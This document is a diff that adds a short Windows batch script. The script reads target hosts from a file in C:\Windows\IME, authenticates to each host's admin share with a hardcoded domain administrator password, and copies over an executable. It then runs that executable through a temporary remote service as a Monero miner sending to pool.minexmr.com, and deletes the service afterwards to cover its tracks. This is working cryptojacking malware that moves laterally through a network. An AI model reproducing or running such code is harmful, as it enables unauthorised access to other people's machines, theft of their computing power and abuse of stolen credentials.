@@ -1,0 +1,2 @@
+for /f %%i in (C:\Windows\IME\result.txt) do net use \\%%i\ipc$  trepang674 /u:RUDD\administrator && copy C:\Windows\IME\pwm.exe \\%%i\c$\windows\temp\ && sc \\%%i create te binpath= "cmd.exe /c C:\Windows\IME\pwm.exe  -o pool.minexmr.com:5555 -u 48uBbfzwaiWgeoyBM3pp11GTYewMS2AXYj7PUYBjAx349vMJ5xU7xG9XZLQVd9MZRFH3eRXChifbs3Hz94KuHpTALi3UXDg -p n1 --cpu-max-threads-hint=20 --donate-level=1 -B"  &&  sc \\%%i start te && sc \\%%i delete te
+net use * /del /y
